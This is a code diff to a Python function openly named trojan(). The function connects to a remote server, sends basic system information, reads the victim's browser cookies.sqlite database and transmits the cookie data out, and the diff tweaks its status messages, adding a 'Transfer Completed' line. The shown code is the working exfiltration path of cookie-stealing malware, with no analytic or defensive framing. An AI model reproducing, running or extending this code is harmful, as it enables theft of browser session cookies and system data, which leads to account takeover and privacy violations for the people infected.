@@ -28,7 +28,7 @@ def trojan():
     # Connect to the server
     try:
         client.connect((serv_addr, port))
-        client.sendall("[Client] Fetching Basic System Information\n".encode())
+        client.sendall("[Client] Fetching Basic System Information".encode())
         client.sendall(data.encode())
 
         # Get the path to the cookies.sqlite file
@@ -76,6 +76,7 @@ def trojan():
                 cookie_data += "----------------------\n"
                 client.sendall(cookie_data.encode())
 
+            client.sendall("[Client] Transfer Completed!".encode())
             # Close the database connection
             conn.close()
 
